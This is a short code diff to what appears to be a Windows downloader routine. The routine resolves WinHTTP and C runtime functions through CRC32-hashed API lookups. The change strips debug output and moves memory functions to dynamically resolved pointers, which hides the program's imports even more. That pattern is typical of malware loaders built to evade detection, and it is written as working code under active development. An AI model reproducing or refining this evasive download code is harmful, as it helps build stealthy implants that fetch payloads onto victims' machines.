@@ -22,15 +22,6 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
     g_Api.pWinHttpCloseHandle = (fnWinHttpCloseHandle)GetProcAddressH(winhttp_handle, WinHttpCloseHandle_CRC32);
     g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), GetTickCount64_CRC32);
 
-    if (g_Api.pGetTickCount64 == NULL) printf("GetTickCount64\n");
-    if (g_Api.pWinHttpOpen == NULL) printf("WinHttpOpen\n");
-    if (g_Api.pWinHttpConnect == NULL) printf("WinHttpConnect\n");
-    if (g_Api.pWinHttpOpenRequest == NULL) printf("WinHttpOpenRequest\n");
-    if (g_Api.pWinHttpSendRequest == NULL) printf("WinHttpSendRequest\n");
-    if (g_Api.pWinHttpReceiveResponse == NULL) printf("WinHttpReceiveResponse\n");
-    if (g_Api.pWinHttpReadData == NULL) printf("WinHttpReadData\n");
-    if (g_Api.pWinHttpCloseHandle == NULL) printf("WinHttpCloseHandle\n");
-
     DWORD bytesRead = 0;
     DWORD totalBytesRead = 0;
     const DWORD bufferSize = 1024;
@@ -74,17 +65,17 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
         return -1;
     }
 
-    *response = (char*)malloc(1);
+    *response = (char*)apis.msvcrt.malloc(1);
     do {
         if (g_Api.pWinHttpReadData(hRequest, buffer, bufferSize, &bytesRead)) {
             if (bytesRead > 0) {
-                char* temp = (char*)realloc(*response, totalBytesRead + bytesRead + 1);
+                char* temp = (char*)apis.msvcrt.realloc(*response, totalBytesRead + bytesRead + 1);
                 if (temp == NULL) {
                     return -1;
                 }
                 else {
                     *response = temp;
-                    memcpy(*response + totalBytesRead, buffer, bytesRead);
+                    apis.msvcrt.memcpy(*response + totalBytesRead, buffer, bytesRead);
                     totalBytesRead += bytesRead;
                     (*response)[totalBytesRead] = '\0';
                 }
